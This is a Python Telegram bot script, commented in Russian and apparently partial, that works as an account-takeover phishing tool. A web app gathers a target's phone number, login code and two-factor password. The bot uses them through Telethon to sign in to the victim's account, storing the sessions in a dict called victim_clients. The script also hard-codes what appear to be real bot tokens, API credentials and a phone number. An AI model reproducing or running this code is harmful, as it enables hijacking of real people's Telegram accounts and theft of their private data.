import json, asyncio, logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import WebAppInfo, MenuButtonWebApp
from telethon import TelegramClient, errors

# --- ТВОИ ДАННЫЕ ---
BOT_TOKEN = "8611748903:AAGxBTXL74UfjsO26s5ZT4h6mts2VwCBpU0"
API_ID = 28687552
API_HASH = "1abf9a58d0c22f62437bec89bd6b27a3"
ADMIN_ID = 174415647
WEB_APP_URL = "https://dreiner.onrender.com"
YOUR_PHONE = "+62895328162607" # Твой номер

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
admin_client = TelegramClient('admin_auth', API_ID, API_HASH)
victim_clients = {}

@dp.message(F.web_app_data)
async def handle_web_app_data(m: types.Message):
    data = json.loads(m.web_app_data.data)
    action, phone = data.get("action"), data.get("phone")
    
    if action == "send_code":
        await m.answer(f"📩 Запрашиваю код для `{phone}`...")
        client = TelegramClient(f'v_{phone}', API_ID, API_HASH)
        victim_clients[phone] = client
        await client.connect()
        try:
            await client.send_code_request(phone)
            await m.answer("✅ Код отправлен!")
        except Exception as e: await m.answer(f"❌ Ошибка: {e}")

    elif action == "try_login" or action == "login_2fa":
        code = data.get("code")
        password = data.get("password")
        client = victim_clients.get(phone)
        
        try:
            if action == "try_login":
                await client.sign_in(phone, code)
            else:
                await client.sign_in(password=password) # Вход с 2FA
            
            await m.answer(f"🔓 **ВХОД В {phone} УСПЕШЕН!**")
        except errors.SessionPasswordNeededError:
            await m.answer("🔐 **Требуется облачный пароль (2FA)!**")
        except Exception as e:
            await m.answer(f"❌ Ошибка: {e}")

# ... (остальной код авторизации админа оставляем прежним)
